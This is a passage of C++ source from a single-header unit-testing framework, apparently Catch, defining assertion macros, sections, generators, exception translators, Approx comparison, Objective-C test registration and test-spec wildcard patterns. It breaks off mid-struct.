///////////////////////////////////////////////////////////////////////////////
// In the event of a failure works out if the debugger needs to be invoked
// and/or an exception thrown and takes appropriate action.
// This needs to be done as a macro so the debugger will stop in the user
// source code rather than in Catch library code
#define INTERNAL_CATCH_REACT( resultBuilder ) \
    if( resultBuilder.shouldDebugBreak() ) CATCH_BREAK_INTO_DEBUGGER(); \
    resultBuilder.react();

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_TEST( expr, resultDisposition, macroName ) \
    do { \
        Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, #expr, resultDisposition ); \
        try { \
            CATCH_INTERNAL_SUPPRESS_PARENTHESES_WARNINGS \
            ( __catchResult <= expr ).endExpression(); \
        } \
        catch( ... ) { \
            __catchResult.useActiveException( Catch::ResultDisposition::Normal ); \
        } \
        INTERNAL_CATCH_REACT( __catchResult ) \
    } while( Catch::isTrue( false && static_cast<bool>(expr) ) ) // expr here is never evaluated at runtime but it forces the compiler to give it a look

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_IF( expr, resultDisposition, macroName ) \
    INTERNAL_CATCH_TEST( expr, resultDisposition, macroName ); \
    if( Catch::getResultCapture().getLastResult()->succeeded() )

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_ELSE( expr, resultDisposition, macroName ) \
    INTERNAL_CATCH_TEST( expr, resultDisposition, macroName ); \
    if( !Catch::getResultCapture().getLastResult()->succeeded() )

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_NO_THROW( expr, resultDisposition, macroName ) \
    do { \
        Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, #expr, resultDisposition ); \
        try { \
            expr; \
            __catchResult.captureResult( Catch::ResultWas::Ok ); \
        } \
        catch( ... ) { \
            __catchResult.useActiveException( resultDisposition ); \
        } \
        INTERNAL_CATCH_REACT( __catchResult ) \
    } while( Catch::alwaysFalse() )

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_THROWS( expr, resultDisposition, matcher, macroName ) \
    do { \
        Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, #expr, resultDisposition, #matcher ); \
        if( __catchResult.allowThrows() ) \
            try { \
                expr; \
                __catchResult.captureResult( Catch::ResultWas::DidntThrowException ); \
            } \
            catch( ... ) { \
                __catchResult.captureExpectedException( matcher ); \
            } \
        else \
            __catchResult.captureResult( Catch::ResultWas::Ok ); \
        INTERNAL_CATCH_REACT( __catchResult ) \
    } while( Catch::alwaysFalse() )

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_THROWS_AS( expr, exceptionType, resultDisposition, macroName ) \
    do { \
        Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, #expr, resultDisposition ); \
        if( __catchResult.allowThrows() ) \
            try { \
                expr; \
                __catchResult.captureResult( Catch::ResultWas::DidntThrowException ); \
            } \
            catch( exceptionType ) { \
                __catchResult.captureResult( Catch::ResultWas::Ok ); \
            } \
            catch( ... ) { \
                __catchResult.useActiveException( resultDisposition ); \
            } \
        else \
            __catchResult.captureResult( Catch::ResultWas::Ok ); \
        INTERNAL_CATCH_REACT( __catchResult ) \
    } while( Catch::alwaysFalse() )

///////////////////////////////////////////////////////////////////////////////
#ifdef CATCH_CONFIG_VARIADIC_MACROS
#define INTERNAL_CATCH_MSG( messageType, resultDisposition, macroName, ... ) \
        do { \
            Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, "", resultDisposition ); \
            __catchResult << __VA_ARGS__ + ::Catch::StreamEndStop(); \
            __catchResult.captureResult( messageType ); \
            INTERNAL_CATCH_REACT( __catchResult ) \
        } while( Catch::alwaysFalse() )
#else
#define INTERNAL_CATCH_MSG( messageType, resultDisposition, macroName, log ) \
        do { \
            Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, "", resultDisposition ); \
            __catchResult << log + ::Catch::StreamEndStop(); \
            __catchResult.captureResult( messageType ); \
            INTERNAL_CATCH_REACT( __catchResult ) \
        } while( Catch::alwaysFalse() )
#endif

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_INFO( log, macroName ) \
    Catch::ScopedMessage INTERNAL_CATCH_UNIQUE_NAME( scopedMessage ) = Catch::MessageBuilder( macroName, CATCH_INTERNAL_LINEINFO, Catch::ResultWas::Info ) << log;

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CHECK_THAT( arg, matcher, resultDisposition, macroName ) \
    do { \
        Catch::ResultBuilder __catchResult( macroName, CATCH_INTERNAL_LINEINFO, #arg ", " #matcher, resultDisposition ); \
        try { \
            std::string matcherAsString = (matcher).toString(); \
            __catchResult \
                .setLhs( Catch::toString( arg ) ) \
                .setRhs( matcherAsString == Catch::Detail::unprintableString ? #matcher : matcherAsString ) \
                .setOp( "matches" ) \
                .setResultType( (matcher).match( arg ) ); \
            __catchResult.captureExpression(); \
        } catch( ... ) { \
            __catchResult.useActiveException( resultDisposition | Catch::ResultDisposition::ContinueOnFailure ); \
        } \
        INTERNAL_CATCH_REACT( __catchResult ) \
    } while( Catch::alwaysFalse() )

// #included from: internal/catch_section.h
#define TWOBLUECUBES_CATCH_SECTION_H_INCLUDED

// #included from: catch_section_info.h
#define TWOBLUECUBES_CATCH_SECTION_INFO_H_INCLUDED

// #included from: catch_totals.hpp
#define TWOBLUECUBES_CATCH_TOTALS_HPP_INCLUDED

#include <cstddef>

namespace Catch {

	struct Counts {
		Counts() : passed(0), failed(0), failedButOk(0) {}

		Counts operator - (Counts const& other) const {
			Counts diff;
			diff.passed = passed - other.passed;
			diff.failed = failed - other.failed;
			diff.failedButOk = failedButOk - other.failedButOk;
			return diff;
		}
		Counts& operator += (Counts const& other) {
			passed += other.passed;
			failed += other.failed;
			failedButOk += other.failedButOk;
			return *this;
		}

		std::size_t total() const {
			return passed + failed + failedButOk;
		}
		bool allPassed() const {
			return failed == 0 && failedButOk == 0;
		}
		bool allOk() const {
			return failed == 0;
		}

		std::size_t passed;
		std::size_t failed;
		std::size_t failedButOk;
	};

	struct Totals {

		Totals operator - (Totals const& other) const {
			Totals diff;
			diff.assertions = assertions - other.assertions;
			diff.testCases = testCases - other.testCases;
			return diff;
		}

		Totals delta(Totals const& prevTotals) const {
			Totals diff = *this - prevTotals;
			if (diff.assertions.failed > 0)
				++diff.testCases.failed;
			else if (diff.assertions.failedButOk > 0)
				++diff.testCases.failedButOk;
			else
				++diff.testCases.passed;
			return diff;
		}

		Totals& operator += (Totals const& other) {
			assertions += other.assertions;
			testCases += other.testCases;
			return *this;
		}

		Counts assertions;
		Counts testCases;
	};
}

namespace Catch {

	struct SectionInfo {
		SectionInfo
		(SourceLineInfo const& _lineInfo,
			std::string const& _name,
			std::string const& _description = std::string());

		std::string name;
		std::string description;
		SourceLineInfo lineInfo;
	};

	struct SectionEndInfo {
		SectionEndInfo(SectionInfo const& _sectionInfo, Counts const& _prevAssertions, double _durationInSeconds)
			: sectionInfo(_sectionInfo), prevAssertions(_prevAssertions), durationInSeconds(_durationInSeconds)
		{}

		SectionInfo sectionInfo;
		Counts prevAssertions;
		double durationInSeconds;
	};

} // end namespace Catch

  // #included from: catch_timer.h
#define TWOBLUECUBES_CATCH_TIMER_H_INCLUDED

#ifdef CATCH_PLATFORM_WINDOWS
typedef unsigned long long uint64_t;
#else
#include <stdint.h>
#endif

namespace Catch {

	class Timer {
	public:
		Timer() : m_ticks(0) {}
		void start();
		unsigned int getElapsedMicroseconds() const;
		unsigned int getElapsedMilliseconds() const;
		double getElapsedSeconds() const;

	private:
		uint64_t m_ticks;
	};

} // namespace Catch

#include <string>

namespace Catch {

	class Section : NonCopyable {
	public:
		Section(SectionInfo const& info);
		~Section();

		// This indicates whether the section should be executed or not
		operator bool() const;

	private:
		SectionInfo m_info;

		std::string m_name;
		Counts m_assertions;
		bool m_sectionIncluded;
		Timer m_timer;
	};

} // end namespace Catch

#ifdef CATCH_CONFIG_VARIADIC_MACROS
#define INTERNAL_CATCH_SECTION( ... ) \
        if( Catch::Section const& INTERNAL_CATCH_UNIQUE_NAME( catch_internal_Section ) = Catch::SectionInfo( CATCH_INTERNAL_LINEINFO, __VA_ARGS__ ) )
#else
#define INTERNAL_CATCH_SECTION( name, desc ) \
        if( Catch::Section const& INTERNAL_CATCH_UNIQUE_NAME( catch_internal_Section ) = Catch::SectionInfo( CATCH_INTERNAL_LINEINFO, name, desc ) )
#endif

  // #included from: internal/catch_generators.hpp
#define TWOBLUECUBES_CATCH_GENERATORS_HPP_INCLUDED

#include <iterator>
#include <vector>
#include <string>
#include <stdlib.h>

namespace Catch {

	template<typename T>
	struct IGenerator {
		virtual ~IGenerator() {}
		virtual T getValue(std::size_t index) const = 0;
		virtual std::size_t size() const = 0;
	};

	template<typename T>
	class BetweenGenerator : public IGenerator<T> {
	public:
		BetweenGenerator(T from, T to) : m_from(from), m_to(to) {}

		virtual T getValue(std::size_t index) const {
			return m_from + static_cast<int>(index);
		}

		virtual std::size_t size() const {
			return static_cast<std::size_t>(1 + m_to - m_from);
		}

	private:

		T m_from;
		T m_to;
	};

	template<typename T>
	class ValuesGenerator : public IGenerator<T> {
	public:
		ValuesGenerator() {}

		void add(T value) {
			m_values.push_back(value);
		}

		virtual T getValue(std::size_t index) const {
			return m_values[index];
		}

		virtual std::size_t size() const {
			return m_values.size();
		}

	private:
		std::vector<T> m_values;
	};

	template<typename T>
	class CompositeGenerator {
	public:
		CompositeGenerator() : m_totalSize(0) {}

		// *** Move semantics, similar to auto_ptr ***
		CompositeGenerator(CompositeGenerator& other)
			: m_fileInfo(other.m_fileInfo),
			m_totalSize(0)
		{
			move(other);
		}

		CompositeGenerator& setFileInfo(const char* fileInfo) {
			m_fileInfo = fileInfo;
			return *this;
		}

		~CompositeGenerator() {
			deleteAll(m_composed);
		}

		operator T () const {
			size_t overallIndex = getCurrentContext().getGeneratorIndex(m_fileInfo, m_totalSize);

			typename std::vector<const IGenerator<T>*>::const_iterator it = m_composed.begin();
			typename std::vector<const IGenerator<T>*>::const_iterator itEnd = m_composed.end();
			for (size_t index = 0; it != itEnd; ++it)
			{
				const IGenerator<T>* generator = *it;
				if (overallIndex >= index && overallIndex < index + generator->size())
				{
					return generator->getValue(overallIndex - index);
				}
				index += generator->size();
			}
			CATCH_INTERNAL_ERROR("Indexed past end of generated range");
			return T(); // Suppress spurious "not all control paths return a value" warning in Visual Studio - if you know how to fix this please do so
		}

		void add(const IGenerator<T>* generator) {
			m_totalSize += generator->size();
			m_composed.push_back(generator);
		}

		CompositeGenerator& then(CompositeGenerator& other) {
			move(other);
			return *this;
		}

		CompositeGenerator& then(T value) {
			ValuesGenerator<T>* valuesGen = new ValuesGenerator<T>();
			valuesGen->add(value);
			add(valuesGen);
			return *this;
		}

	private:

		void move(CompositeGenerator& other) {
			std::copy(other.m_composed.begin(), other.m_composed.end(), std::back_inserter(m_composed));
			m_totalSize += other.m_totalSize;
			other.m_composed.clear();
		}

		std::vector<const IGenerator<T>*> m_composed;
		std::string m_fileInfo;
		size_t m_totalSize;
	};

	namespace Generators
	{
		template<typename T>
		CompositeGenerator<T> between(T from, T to) {
			CompositeGenerator<T> generators;
			generators.add(new BetweenGenerator<T>(from, to));
			return generators;
		}

		template<typename T>
		CompositeGenerator<T> values(T val1, T val2) {
			CompositeGenerator<T> generators;
			ValuesGenerator<T>* valuesGen = new ValuesGenerator<T>();
			valuesGen->add(val1);
			valuesGen->add(val2);
			generators.add(valuesGen);
			return generators;
		}

		template<typename T>
		CompositeGenerator<T> values(T val1, T val2, T val3) {
			CompositeGenerator<T> generators;
			ValuesGenerator<T>* valuesGen = new ValuesGenerator<T>();
			valuesGen->add(val1);
			valuesGen->add(val2);
			valuesGen->add(val3);
			generators.add(valuesGen);
			return generators;
		}

		template<typename T>
		CompositeGenerator<T> values(T val1, T val2, T val3, T val4) {
			CompositeGenerator<T> generators;
			ValuesGenerator<T>* valuesGen = new ValuesGenerator<T>();
			valuesGen->add(val1);
			valuesGen->add(val2);
			valuesGen->add(val3);
			valuesGen->add(val4);
			generators.add(valuesGen);
			return generators;
		}

	} // end namespace Generators

	using namespace Generators;

} // end namespace Catch

#define INTERNAL_CATCH_LINESTR2( line ) #line
#define INTERNAL_CATCH_LINESTR( line ) INTERNAL_CATCH_LINESTR2( line )

#define INTERNAL_CATCH_GENERATE( expr ) expr.setFileInfo( __FILE__ "(" INTERNAL_CATCH_LINESTR( __LINE__ ) ")" )

  // #included from: internal/catch_interfaces_exception.h
#define TWOBLUECUBES_CATCH_INTERFACES_EXCEPTION_H_INCLUDED

#include <string>
#include <vector>

  // #included from: catch_interfaces_registry_hub.h
#define TWOBLUECUBES_CATCH_INTERFACES_REGISTRY_HUB_H_INCLUDED

#include <string>

namespace Catch {

	class TestCase;
	struct ITestCaseRegistry;
	struct IExceptionTranslatorRegistry;
	struct IExceptionTranslator;
	struct IReporterRegistry;
	struct IReporterFactory;

	struct IRegistryHub {
		virtual ~IRegistryHub();

		virtual IReporterRegistry const& getReporterRegistry() const = 0;
		virtual ITestCaseRegistry const& getTestCaseRegistry() const = 0;
		virtual IExceptionTranslatorRegistry& getExceptionTranslatorRegistry() = 0;
	};

	struct IMutableRegistryHub {
		virtual ~IMutableRegistryHub();
		virtual void registerReporter(std::string const& name, Ptr<IReporterFactory> const& factory) = 0;
		virtual void registerListener(Ptr<IReporterFactory> const& factory) = 0;
		virtual void registerTest(TestCase const& testInfo) = 0;
		virtual void registerTranslator(const IExceptionTranslator* translator) = 0;
	};

	IRegistryHub& getRegistryHub();
	IMutableRegistryHub& getMutableRegistryHub();
	void cleanUp();
	std::string translateActiveException();

}

namespace Catch {

	typedef std::string(*exceptionTranslateFunction)();

	struct IExceptionTranslator;
	typedef std::vector<const IExceptionTranslator*> ExceptionTranslators;

	struct IExceptionTranslator {
		virtual ~IExceptionTranslator();
		virtual std::string translate(ExceptionTranslators::const_iterator it, ExceptionTranslators::const_iterator itEnd) const = 0;
	};

	struct IExceptionTranslatorRegistry {
		virtual ~IExceptionTranslatorRegistry();

		virtual std::string translateActiveException() const = 0;
	};

	class ExceptionTranslatorRegistrar {
		template<typename T>
		class ExceptionTranslator : public IExceptionTranslator {
		public:

			ExceptionTranslator(std::string(*translateFunction)(T&))
				: m_translateFunction(translateFunction)
			{}

			virtual std::string translate(ExceptionTranslators::const_iterator it, ExceptionTranslators::const_iterator itEnd) const CATCH_OVERRIDE {
				try {
					if (it == itEnd)
						throw;
					else
						return (*it)->translate(it + 1, itEnd);
				}
				catch (T& ex) {
					return m_translateFunction(ex);
				}
			}

		protected:
			std::string(*m_translateFunction)(T&);
		};

	public:
		template<typename T>
		ExceptionTranslatorRegistrar(std::string(*translateFunction)(T&)) {
			getMutableRegistryHub().registerTranslator
			(new ExceptionTranslator<T>(translateFunction));
		}
	};
}

///////////////////////////////////////////////////////////////////////////////
#define INTERNAL_CATCH_TRANSLATE_EXCEPTION2( translatorName, signature ) \
    static std::string translatorName( signature ); \
    namespace{ Catch::ExceptionTranslatorRegistrar INTERNAL_CATCH_UNIQUE_NAME( catch_internal_ExceptionRegistrar )( &translatorName ); }\
    static std::string translatorName( signature )

#define INTERNAL_CATCH_TRANSLATE_EXCEPTION( signature ) INTERNAL_CATCH_TRANSLATE_EXCEPTION2( INTERNAL_CATCH_UNIQUE_NAME( catch_internal_ExceptionTranslator ), signature )

// #included from: internal/catch_approx.hpp
#define TWOBLUECUBES_CATCH_APPROX_HPP_INCLUDED

#include <cmath>
#include <limits>

namespace Catch {
	namespace Detail {

		class Approx {
		public:
			explicit Approx(double value)
				: m_epsilon(std::numeric_limits<float>::epsilon() * 100),
				m_scale(1.0),
				m_value(value)
			{}

			Approx(Approx const& other)
				: m_epsilon(other.m_epsilon),
				m_scale(other.m_scale),
				m_value(other.m_value)
			{}

			static Approx custom() {
				return Approx(0);
			}

			Approx operator()(double value) {
				Approx approx(value);
				approx.epsilon(m_epsilon);
				approx.scale(m_scale);
				return approx;
			}

			friend bool operator == (double lhs, Approx const& rhs) {
				// Thanks to Richard Harris for his help refining this formula
				return fabs(lhs - rhs.m_value) < rhs.m_epsilon * (rhs.m_scale + (std::max)(fabs(lhs), fabs(rhs.m_value)));
			}

			friend bool operator == (Approx const& lhs, double rhs) {
				return operator==(rhs, lhs);
			}

			friend bool operator != (double lhs, Approx const& rhs) {
				return !operator==(lhs, rhs);
			}

			friend bool operator != (Approx const& lhs, double rhs) {
				return !operator==(rhs, lhs);
			}

			Approx& epsilon(double newEpsilon) {
				m_epsilon = newEpsilon;
				return *this;
			}

			Approx& scale(double newScale) {
				m_scale = newScale;
				return *this;
			}

			std::string toString() const {
				std::ostringstream oss;
				oss << "Approx( " << Catch::toString(m_value) << " )";
				return oss.str();
			}

		private:
			double m_epsilon;
			double m_scale;
			double m_value;
		};
	}

	template<>
	inline std::string toString<Detail::Approx>(Detail::Approx const& value) {
		return value.toString();
	}

} // end namespace Catch

  // #included from: internal/catch_interfaces_tag_alias_registry.h
#define TWOBLUECUBES_CATCH_INTERFACES_TAG_ALIAS_REGISTRY_H_INCLUDED

  // #included from: catch_tag_alias.h
#define TWOBLUECUBES_CATCH_TAG_ALIAS_H_INCLUDED

#include <string>

namespace Catch {

	struct TagAlias {
		TagAlias(std::string _tag, SourceLineInfo _lineInfo) : tag(_tag), lineInfo(_lineInfo) {}

		std::string tag;
		SourceLineInfo lineInfo;
	};

	struct RegistrarForTagAliases {
		RegistrarForTagAliases(char const* alias, char const* tag, SourceLineInfo const& lineInfo);
	};

} // end namespace Catch

#define CATCH_REGISTER_TAG_ALIAS( alias, spec ) namespace{ Catch::RegistrarForTagAliases INTERNAL_CATCH_UNIQUE_NAME( AutoRegisterTagAlias )( alias, spec, CATCH_INTERNAL_LINEINFO ); }
  // #included from: catch_option.hpp
#define TWOBLUECUBES_CATCH_OPTION_HPP_INCLUDED

namespace Catch {

	// An optional type
	template<typename T>
	class Option {
	public:
		Option() : nullableValue(CATCH_NULL) {}
		Option(T const& _value)
			: nullableValue(new(storage) T(_value))
		{}
		Option(Option const& _other)
			: nullableValue(_other ? new(storage) T(*_other) : CATCH_NULL)
		{}

		~Option() {
			reset();
		}

		Option& operator= (Option const& _other) {
			if (&_other != this) {
				reset();
				if (_other)
					nullableValue = new(storage) T(*_other);
			}
			return *this;
		}
		Option& operator = (T const& _value) {
			reset();
			nullableValue = new(storage) T(_value);
			return *this;
		}

		void reset() {
			if (nullableValue)
				nullableValue->~T();
			nullableValue = CATCH_NULL;
		}

		T& operator*() { return *nullableValue; }
		T const& operator*() const { return *nullableValue; }
		T* operator->() { return nullableValue; }
		const T* operator->() const { return nullableValue; }

		T valueOr(T const& defaultValue) const {
			return nullableValue ? *nullableValue : defaultValue;
		}

		bool some() const { return nullableValue != CATCH_NULL; }
		bool none() const { return nullableValue == CATCH_NULL; }

		bool operator !() const { return nullableValue == CATCH_NULL; }
		operator SafeBool::type() const {
			return SafeBool::makeSafe(some());
		}

	private:
		T* nullableValue;
		char storage[sizeof(T)];
	};

} // end namespace Catch

namespace Catch {

	struct ITagAliasRegistry {
		virtual ~ITagAliasRegistry();
		virtual Option<TagAlias> find(std::string const& alias) const = 0;
		virtual std::string expandAliases(std::string const& unexpandedTestSpec) const = 0;

		static ITagAliasRegistry const& get();
	};

} // end namespace Catch

  // These files are included here so the single_include script doesn't put them
  // in the conditionally compiled sections
  // #included from: internal/catch_test_case_info.h
#define TWOBLUECUBES_CATCH_TEST_CASE_INFO_H_INCLUDED

#include <string>
#include <set>

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wpadded"
#endif

namespace Catch {

	struct ITestCase;

	struct TestCaseInfo {
		enum SpecialProperties {
			None = 0,
			IsHidden = 1 << 1,
			ShouldFail = 1 << 2,
			MayFail = 1 << 3,
			Throws = 1 << 4
		};

		TestCaseInfo(std::string const& _name,
			std::string const& _className,
			std::string const& _description,
			std::set<std::string> const& _tags,
			SourceLineInfo const& _lineInfo);

		TestCaseInfo(TestCaseInfo const& other);

		friend void setTags(TestCaseInfo& testCaseInfo, std::set<std::string> const& tags);

		bool isHidden() const;
		bool throws() const;
		bool okToFail() const;
		bool expectedToFail() const;

		std::string name;
		std::string className;
		std::string description;
		std::set<std::string> tags;
		std::set<std::string> lcaseTags;
		std::string tagsAsString;
		SourceLineInfo lineInfo;
		SpecialProperties properties;
	};

	class TestCase : public TestCaseInfo {
	public:

		TestCase(ITestCase* testCase, TestCaseInfo const& info);
		TestCase(TestCase const& other);

		TestCase withName(std::string const& _newName) const;

		void invoke() const;

		TestCaseInfo const& getTestCaseInfo() const;

		void swap(TestCase& other);
		bool operator == (TestCase const& other) const;
		bool operator < (TestCase const& other) const;
		TestCase& operator = (TestCase const& other);

	private:
		Ptr<ITestCase> test;
	};

	TestCase makeTestCase(ITestCase* testCase,
		std::string const& className,
		std::string const& name,
		std::string const& description,
		SourceLineInfo const& lineInfo);
}

#ifdef __clang__
#pragma clang diagnostic pop
#endif


#ifdef __OBJC__
// #included from: internal/catch_objc.hpp
#define TWOBLUECUBES_CATCH_OBJC_HPP_INCLUDED

#import <objc/runtime.h>

#include <string>

// NB. Any general catch headers included here must be included
// in catch.hpp first to make sure they are included by the single
// header for non obj-usage

///////////////////////////////////////////////////////////////////////////////
// This protocol is really only here for (self) documenting purposes, since
// all its methods are optional.
@protocol OcFixture

@optional

- (void)setUp;
-(void)tearDown;

@end

namespace Catch {

	class OcMethod : public SharedImpl<ITestCase> {

	public:
		OcMethod(Class cls, SEL sel) : m_cls(cls), m_sel(sel) {}

		virtual void invoke() const {
			id obj = [[m_cls alloc] init];

			performOptionalSelector(obj, @selector(setUp)  );
			performOptionalSelector(obj, m_sel);
			performOptionalSelector(obj, @selector(tearDown)  );

			arcSafeRelease(obj);
		}
	private:
		virtual ~OcMethod() {}

		Class m_cls;
		SEL m_sel;
	};

	namespace Detail {

		inline std::string getAnnotation(Class cls,
			std::string const& annotationName,
			std::string const& testCaseName) {
			NSString* selStr = [[NSString alloc] initWithFormat:@"Catch_%s_%s", annotationName.c_str(), testCaseName.c_str()];
				SEL sel = NSSelectorFromString(selStr);
			arcSafeRelease(selStr);
			id value = performOptionalSelector(cls, sel);
			if (value)
				return[(NSString*)value UTF8String];
			return "";
		}
	}

	inline size_t registerTestMethods() {
		size_t noTestMethods = 0;
		int noClasses = objc_getClassList(CATCH_NULL, 0);

		Class* classes = (CATCH_UNSAFE_UNRETAINED Class *)malloc(sizeof(Class) * noClasses);
		objc_getClassList(classes, noClasses);

		for (int c = 0; c < noClasses; c++) {
			Class cls = classes[c];
			{
				u_int count;
				Method* methods = class_copyMethodList(cls, &count);
				for (u_int m = 0; m < count; m++) {
					SEL selector = method_getName(methods[m]);
					std::string methodName = sel_getName(selector);
					if (startsWith(methodName, "Catch_TestCase_")) {
						std::string testCaseName = methodName.substr(15);
						std::string name = Detail::getAnnotation(cls, "Name", testCaseName);
						std::string desc = Detail::getAnnotation(cls, "Description", testCaseName);
						const char* className = class_getName(cls);

						getMutableRegistryHub().registerTest(makeTestCase(new OcMethod(cls, selector), className, name.c_str(), desc.c_str(), SourceLineInfo()));
						noTestMethods++;
					}
				}
				free(methods);
			}
		}
		return noTestMethods;
	}

	namespace Matchers {
		namespace Impl {
			namespace NSStringMatchers {

				template<typename MatcherT>
				struct StringHolder : MatcherImpl<MatcherT, NSString*> {
					StringHolder(NSString* substr) : m_substr([substr copy]) {}
					StringHolder(StringHolder const& other) : m_substr([other.m_substr copy]) {}
					StringHolder() {
						arcSafeRelease(m_substr);
					}

					NSString* m_substr;
				};

				struct Equals : StringHolder<Equals> {
					Equals(NSString* substr) : StringHolder(substr) {}

					virtual bool match(ExpressionType const& str) const {
						return  (str != nil || m_substr == nil) &&
							[str isEqualToString : m_substr];
					}

					virtual std::string toString() const {
						return "equals string: " + Catch::toString(m_substr);
					}
				};

				struct Contains : StringHolder<Contains> {
					Contains(NSString* substr) : StringHolder(substr) {}

					virtual bool match(ExpressionType const& str) const {
						return  (str != nil || m_substr == nil) &&
							[str rangeOfString : m_substr].location != NSNotFound;
					}

					virtual std::string toString() const {
						return "contains string: " + Catch::toString(m_substr);
					}
				};

				struct StartsWith : StringHolder<StartsWith> {
					StartsWith(NSString* substr) : StringHolder(substr) {}

					virtual bool match(ExpressionType const& str) const {
						return  (str != nil || m_substr == nil) &&
							[str rangeOfString : m_substr].location == 0;
					}

					virtual std::string toString() const {
						return "starts with: " + Catch::toString(m_substr);
					}
				};
				struct EndsWith : StringHolder<EndsWith> {
					EndsWith(NSString* substr) : StringHolder(substr) {}

					virtual bool match(ExpressionType const& str) const {
						return  (str != nil || m_substr == nil) &&
							[str rangeOfString : m_substr].location == [str length] - [m_substr length];
					}

					virtual std::string toString() const {
						return "ends with: " + Catch::toString(m_substr);
					}
				};

			} // namespace NSStringMatchers
		} // namespace Impl

		inline Impl::NSStringMatchers::Equals
			Equals(NSString* substr) { return Impl::NSStringMatchers::Equals(substr); }

		inline Impl::NSStringMatchers::Contains
			Contains(NSString* substr) { return Impl::NSStringMatchers::Contains(substr); }

		inline Impl::NSStringMatchers::StartsWith
			StartsWith(NSString* substr) { return Impl::NSStringMatchers::StartsWith(substr); }

		inline Impl::NSStringMatchers::EndsWith
			EndsWith(NSString* substr) { return Impl::NSStringMatchers::EndsWith(substr); }

	} // namespace Matchers

	using namespace Matchers;

} // namespace Catch

  ///////////////////////////////////////////////////////////////////////////////
#define OC_TEST_CASE( name, desc )\
+(NSString*) INTERNAL_CATCH_UNIQUE_NAME( Catch_Name_test ) \
{\
return @ name; \
}\
+(NSString*) INTERNAL_CATCH_UNIQUE_NAME( Catch_Description_test ) \
{ \
return @ desc; \
} \
-(void) INTERNAL_CATCH_UNIQUE_NAME( Catch_TestCase_test )

#endif

#ifdef CATCH_IMPL
  // #included from: internal/catch_impl.hpp
#define TWOBLUECUBES_CATCH_IMPL_HPP_INCLUDED

  // Collect all the implementation files together here
  // These are the equivalent of what would usually be cpp files

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wweak-vtables"
#endif

  // #included from: ../catch_session.hpp
#define TWOBLUECUBES_CATCH_RUNNER_HPP_INCLUDED

  // #included from: internal/catch_commandline.hpp
#define TWOBLUECUBES_CATCH_COMMANDLINE_HPP_INCLUDED

  // #included from: catch_config.hpp
#define TWOBLUECUBES_CATCH_CONFIG_HPP_INCLUDED

  // #included from: catch_test_spec_parser.hpp
#define TWOBLUECUBES_CATCH_TEST_SPEC_PARSER_HPP_INCLUDED

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wpadded"
#endif

  // #included from: catch_test_spec.hpp
#define TWOBLUECUBES_CATCH_TEST_SPEC_HPP_INCLUDED

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wpadded"
#endif

  // #included from: catch_wildcard_pattern.hpp
#define TWOBLUECUBES_CATCH_WILDCARD_PATTERN_HPP_INCLUDED

namespace Catch
{
	class WildcardPattern {
		enum WildcardPosition {
			NoWildcard = 0,
			WildcardAtStart = 1,
			WildcardAtEnd = 2,
			WildcardAtBothEnds = WildcardAtStart | WildcardAtEnd
		};

	public:

		WildcardPattern(std::string const& pattern, CaseSensitive::Choice caseSensitivity)
			: m_caseSensitivity(caseSensitivity),
			m_wildcard(NoWildcard),
			m_pattern(adjustCase(pattern))
		{
			if (startsWith(m_pattern, "*")) {
				m_pattern = m_pattern.substr(1);
				m_wildcard = WildcardAtStart;
			}
			if (endsWith(m_pattern, "*")) {
				m_pattern = m_pattern.substr(0, m_pattern.size() - 1);
				m_wildcard = static_cast<WildcardPosition>(m_wildcard | WildcardAtEnd);
			}
		}
		virtual ~WildcardPattern();
		virtual bool matches(std::string const& str) const {
			switch (m_wildcard) {
			case NoWildcard:
				return m_pattern == adjustCase(str);
			case WildcardAtStart:
				return endsWith(adjustCase(str), m_pattern);
			case WildcardAtEnd:
				return startsWith(adjustCase(str), m_pattern);
			case WildcardAtBothEnds:
				return contains(adjustCase(str), m_pattern);
			}

#ifdef __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wunreachable-code"
#endif
			throw std::logic_error("Unknown enum");
#ifdef __clang__
#pragma clang diagnostic pop
#endif
		}
	private:
		std::string adjustCase(std::string const& str) const {
			return m_caseSensitivity == CaseSensitive::No ? toLower(str) : str;
		}
		CaseSensitive::Choice m_caseSensitivity;
		WildcardPosition m_wildcard;
		std::string m_pattern;
	};
}

#include <string>
#include <vector>

namespace Catch {

	class TestSpec {
		struct Pattern : SharedImpl<> {
			virtual ~Pattern();
			virtual bool matches(TestCaseInfo const& testCase) const = 0;
		};
		class NamePattern : public Pattern {
		public:
			NamePattern(std::string const& name)
				: m_wildcardPattern(toLower(name), CaseSensitive::No)
			{}
			virtual ~NamePattern();
			virtual bool matches(TestCaseInfo const& testCase) const {
				return m_wildcardPattern.matches(toLower(testCase.name));
			}
		private:
			WildcardPattern m_wildcardPattern;
		};

		class TagPattern : public Pattern {
		public:
			TagPattern(std::string const& tag) : m_tag(toLower(tag)) {}
			virtual ~TagPattern();
			virtual bool matches(TestCaseInfo const& testCase) const {
				return testCase.lcaseTags.find(m_tag) != testCase.lcaseTags.end();
			}
		private:
			std::string m_tag;
		};

		class ExcludedPattern : public Pattern {
		public:
			ExcludedPattern(Ptr<Pattern> const& underlyingPattern) : m_underlyingPattern(underlyingPattern) {}
			virtual ~ExcludedPattern();
			virtual bool matches(TestCaseInfo const& testCase) const { return !m_underlyingPattern->matches(testCase); }
		private:
			Ptr<Pattern> m_underlyingPattern;
		};

		struct Filter {
